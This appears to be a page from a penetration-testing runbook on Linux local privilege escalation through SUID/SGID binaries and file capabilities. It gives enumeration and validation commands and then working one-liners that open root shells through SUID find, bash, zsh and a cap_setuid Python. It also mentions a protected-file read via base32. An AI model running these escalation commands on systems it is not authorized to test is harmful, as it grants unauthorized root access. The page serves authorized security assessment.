# LPRIV-04. SUID, SGID, and capabilities

**Run this when:** sudo has no usable rule, or you need to inventory executable privilege attributes.

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /opt -xdev -type f \
  \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
getcap -r /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /opt 2>/dev/null
```

If the scoped pass is insufficient, widen once without crossing filesystems:

```bash
timeout 30s find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
timeout 30s getcap -r / 2>/dev/null
```

**Look for:** nonstandard binaries, owner-SUID executables, `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_admin`, relative commands, and PATH lookups.

## Validate one candidate

```bash
stat -- '<ABSOLUTE_CANDIDATE>'
file -- '<ABSOLUTE_CANDIDATE>'
getcap -v -- '<ABSOLUTE_CANDIDATE>' 2>/dev/null
findmnt -T '<ABSOLUTE_CANDIDATE>' -o TARGET,SOURCE,FSTYPE,OPTIONS
grep -E '^(Uid|Gid|NoNewPrivs):' /proc/$$/status
```

Mount options and `NoNewPrivs` can block a valid-looking attribute. Do not add SUID bits or capabilities to manufacture a lead.

**If found:** PATH-resolved commands route to [LPRIV-09](./lpriv-09). Writable dependencies route to [LPRIV-06](./lpriv-06). A matching executable case continues below.

## Use an exact, reviewed behavior

```bash
# Examples only when the installed binary and prerequisites match exactly
'<ROOT_SUID_GNU_FIND>' . -exec /bin/sh -p \; -quit
'<OWNER_SUID_GNU_BASH>' --noprofile --norc -p
'<ROOT_SUID_ZSH>' -f -p
'<PYTHON3_WITH_CAP_SETUID_EP>' -I -c 'import os; os.setuid(0); os.execl("/bin/bash","/bin/bash","--noprofile","--norc")'
```

The retired exact cases for SUID GDB and SUID PHP required embedded Python or CLI `pcntl_exec`, then replaced the current process with `/bin/sh -p`. Keep those implementation checks. Do not apply their command to another debugger or PHP handler. The retired SUID encoder case used GNU `base32` to read one already known protected regular file; it was a file-read path, not a shell.

Verify any opened process with absolute `/usr/bin/id`, `/bin/hostname`, and `/proc/self/status`. Exit the child shell; never remove or chmod the installed binary.

**If nothing stands out:** continue to [LPRIV-05](./lpriv-05).
